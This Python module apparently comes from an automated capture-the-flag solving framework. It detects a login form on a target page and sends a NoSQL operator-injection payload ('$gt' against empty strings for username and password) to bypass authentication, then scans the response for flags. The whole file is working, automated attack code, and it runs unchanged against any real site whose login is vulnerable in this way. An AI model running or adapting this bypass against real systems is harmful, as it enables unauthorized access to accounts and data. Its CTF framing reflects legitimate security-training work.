from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web as web
import requests
import magic
import units
import traceback

class Unit(web.WebUnit):

	PRIORITY = 40

	def __init__(self, katana, parent, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, parent, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable('no flag format specified')

		self.session = requests.Session()
		raw_content = self.target.content.decode('utf-8')

		self.action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", raw_content, flags=re.IGNORECASE)
		self.method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", raw_content, flags=re.IGNORECASE)

		self.username = re.findall(web.user_regex, raw_content, flags=re.IGNORECASE)
		self.password = re.findall(web.pass_regex, raw_content, flags=re.IGNORECASE)
		
		# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise units.NotApplicable("no appropriate form fields detected")

	def evaluate(self, katana, case):
		
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0]
			if self.method: method = self.method[0]
			if self.username: username = self.username[0]
			if self.password: password = self.password[0]

			try:
				r = self.session.request(method.lower(), self.target.url_root.rstrip('/') + '/' + action.lstrip('.').lstrip('/'), json = {
					"username" : { "$gt":"" },
					"password" : { "$gt":"" },
				})
				
				# Hunt for flags if we have a successful injection!
				katana.locate_flags(self, r.text)
			except:
				# JOHN: Theoretically, if we find a valid method, this should not error...
				#       But if it does, we should see it.
				traceback.print_exc()
			
			
